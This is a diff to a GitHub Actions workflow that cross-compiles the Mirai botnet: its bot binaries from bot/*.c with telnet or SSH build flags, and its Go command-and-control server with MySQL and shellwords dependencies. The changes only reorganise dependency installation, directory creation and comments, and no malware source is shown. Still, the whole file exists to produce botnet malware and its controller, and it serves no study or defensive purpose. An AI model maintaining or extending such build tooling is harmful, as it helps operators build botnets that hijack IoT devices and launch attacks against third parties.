@@ -20,17 +20,22 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y gcc g++ make golang
 
+      - name: Install Go dependencies
+        run: |
+          cd cnc
+          go get github.com/go-sql-driver/mysql
+          go get github.com/mattn/go-shellwords
+          cd ..
+
       - name: Compile release
         env:
-          BUILD_MODE: debug # Change to 'debug' as needed
-          BUILD_TYPE: telnet # Change to 'telnet' as needed
+          BUILD_MODE: debug # Change to 'release' as needed
+          BUILD_TYPE: telnet # Change to 'ssh' as needed
         run: |
+          # Create necessary directories
+          mkdir -p release debug
+
           # Function to compile bot
-          mkdir release debug
-          cd cnc
-          go get github.com/go-sql-driver/mysql 
-	  go get github.com/mattn/go-shellwords
-          cd ..
           compile_bot() {
             echo "Compiling $2"
             ${1}-gcc -std=c99 $3 bot/*.c -O3 -o release/"$2"
@@ -43,9 +48,6 @@ jobs:
           elif [ "$BUILD_TYPE" == "ssh" ]; then
             FLAGS="-DMIRAI_SSH"
           fi
-
-          # Create the release directory if it doesn't exist
-          mkdir -p release
 
           if [ "$BUILD_MODE" == "release" ]; then
             rm -f release/mirai.* release/miraint.*
